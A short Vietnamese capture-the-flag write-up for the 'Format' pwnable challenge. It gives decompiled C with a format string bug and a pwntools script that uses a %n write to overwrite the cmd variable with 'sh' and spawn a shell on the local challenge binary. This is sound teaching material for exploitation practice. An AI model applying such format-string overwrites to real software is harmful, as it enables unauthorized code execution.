# Format---Write-up-----KCSC Recruitment 2025
Hướng dẫn cách giải bài Format cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 9/8/2026

## 1. Mục tiêu
Bài này NO PIE và có lỗi **Format String**

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("Do you want to get flag^^");
  buf[read(0, buf, 0x25uLL)] = 0;
  printf(buf);
  system(cmd);
  return 0;
}
```

Mục tiêu của chúng ta là sử dụng `%n` để sửa lại biến `cmd` nằm ở vùng `bss`. Quan trọng là phải ghi trong 0x25 byte thôi.

## 2. Cách thực thi
Vì bài này chỉ là 1 lỗi **Format String** nhỏ nên không quá khó, cái khó là làm sao để sử dụng đúng 0x25 byte để ghi đè vô thôi. Các bạn có thể hỏi AI thêm về cách thu gọn lại cho nó xuống thành 0x25 byte.

```Python
from pwn import *

e = ELF('./format')

p = process('./format')

target_addr = p32(0x404060)
sh_val = 26739
offset_of_buf = 6
fmt_str = f"%{sh_val}c"

current_len = len(fmt_str) + 5
padding_len = 16 - current_len
target_offset = offset_of_buf + 2

payload_str = f"{fmt_str}%{target_offset}$n"
payload_str += "A" * (16 - len(payload_str))

payload = payload_str.encode() + p64(target_addr)

print(f"Độ dài payload: {len(payload)} bytes")

p.sendlineafter(b'Do you want to get flag^^', payload)

p.interactive()
```
